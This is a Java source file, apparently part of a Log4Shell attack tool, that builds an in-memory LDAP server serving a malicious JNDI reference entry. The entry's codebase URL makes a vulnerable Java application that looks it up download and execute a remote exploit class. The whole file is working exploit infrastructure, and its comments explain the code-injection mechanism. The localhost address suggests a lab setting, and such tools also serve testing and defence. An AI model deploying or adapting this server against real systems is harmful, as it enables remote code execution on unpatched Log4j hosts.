package log4shell.hacker.tool;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldif.LDIFException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LdapServerSetup {
    private static final Logger log = LogManager.getLogger(LdapServerSetup.class);

    private final int ldapPort;
    private final int httpPort;
    private final Class<?> exploit;
    private final InMemoryDirectoryServer ldapSrv;

    public LdapServerSetup(int ldapPort, int httpPort, Class<?> exploitClass) {
        log.debug("Configuring LDAP server.");
        this.ldapPort = ldapPort;
        this.httpPort = httpPort;
        this.exploit = exploitClass;

        try {
            ldapSrv = configureServer();
        } catch (Exception e) {
            throw new Error("Failed to configure LDAP server.", e);
        }
    }

    private InMemoryDirectoryServer configureServer() throws LDAPException, LDIFException {
        InMemoryDirectoryServerConfig cfg = new InMemoryDirectoryServerConfig ("cn=exploit");
        cfg.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("default", ldapPort));

        // Remove default schema definition to disable all constrains
        // So it is possible to store simplified entry (entity) not following specification
        cfg.setSchema(null);
        InMemoryDirectoryServer result = new InMemoryDirectoryServer(cfg);

        // URL where bytecode is placed
        // See java.net.URLClassLoader for details
        String bytecodeProviderUrl = "http://localhost:" + httpPort + "/" ;//+ exploit.getSimpleName() + ".class";

        // creates (saves) entry specified by RFC 2713 in server
        // when such entry read via JNDI it is interpreted as javax.naming.Reference
        // and for old JREs automatically loads and executes remote bytecode referred in this entry
        result.add(
            "dn: cn=exploit",                       // LDAP Entry relative path.
            "objectClass: javaNamingReference",     // LDAP class specified by RFC 2713.
            "javaClassName: java.lang.Object",      // Java class name of referenced instance
            "javaFactory: " + exploit.getName(),    // Java class name of Factory. And it can be remote which is used to make code injection.
            "javaCodeBase: " + bytecodeProviderUrl  // URL where bytecode of Factory class is downloaded.
        );

        return result;
    }

    public void start() {
        try {
            ldapSrv.startListening();
            log.debug("LDAP server was started.");
        } catch (LDAPException e) {
            throw new Error("Failed to start LDAP server.", e);
        }
    }

    public void stop() {
        ldapSrv.close();
        log.debug("LDAP server was stopped.");
    }
}
